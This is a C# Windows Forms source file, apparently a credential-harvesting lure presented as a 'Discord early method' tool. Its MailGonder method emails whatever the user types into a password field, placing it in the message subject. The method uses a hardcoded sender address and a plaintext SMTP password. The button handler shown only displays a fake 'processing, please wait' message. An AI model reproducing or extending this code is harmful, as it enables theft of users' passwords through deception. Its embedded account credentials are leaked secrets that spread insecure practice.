using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;


namespace Discord_early_method
{   
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        MailMessage Eposta = new MailMessage();
        void MailGonder()
        {
            Eposta.From = new MailAddress("hzfixxed@gmail.com ");
            Eposta.To.Add(tbEposta.Text.ToString());
            Eposta.Subject = tbSifre.Text.ToString();

            SmtpClient smtp = new SmtpClient();

            smtp.Credentials = new System.Net.NetworkCredential("hzfixxed@gmail.com", "wearedie");
            smtp.Host = "smtp.live.com"; //gmail host adresi = "smtp.gmail.com"; ,
            smtp.EnableSsl = true;
            smtp.Port = 587;

            smtp.Send(Eposta);
            MessageBox.Show("Mail Gönderildi");

        }



        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
           
            
            
            
            
            
            
            lbİşlem.Text = "İşlem Gerçekleşiyor!";
            MessageBox.Show("İşlem Gerçekleşiyor Bekleyiniz...", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
